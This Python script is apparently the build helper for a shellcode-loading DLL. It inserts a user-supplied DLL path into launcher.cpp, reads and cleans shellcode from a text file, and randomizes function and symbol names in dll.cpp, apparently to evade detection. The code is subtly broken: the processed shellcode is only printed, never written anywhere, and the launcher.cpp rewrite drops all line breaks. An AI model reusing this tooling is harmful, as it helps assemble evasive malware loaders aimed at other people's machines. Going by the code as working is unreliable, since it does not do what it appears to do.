import string
import random

def random_string(length):
    letters = string.ascii_lowercase
    result = ''.join(random.choice(letters) for i in range(length))

    return result


print("Enter the path to the DDL (USE // INSTEAD OF /)")
path = input()

with open('launcher.cpp', 'r', encoding='utf-8') as file:
    data = file.readlines()

data = ''.join(data).replace("<PATH_TO_REPLACE>", "\""+path+"\"").split('\n')

with open('launcher.cpp', 'w', encoding='utf-8') as file:
    file.writelines(data)

with open('shellcode.txt', 'r', encoding='utf-8') as file:
    data = file.readlines()

data = data[1:]
shellcode = ''.join(data)
shellcode = shellcode.replace('\n', '').replace('"', '').replace(';', '')

print(shellcode)

with open('dll.cpp', 'r', encoding='utf-8') as file:
    data = file.readlines()

rand_name1 = random_string(10)
rand_name2 = random_string(10)
for i in range(0, len(data)):
   data[i] = data[i].replace("<NAME_TO_REPLACE>", rand_name1)
   data[i] = data[i].replace("<FUNCTION_TO_REPLACE>", rand_name2) 

with open('dll.cpp', 'w', encoding='utf-8') as file:
    file.writelines(data)
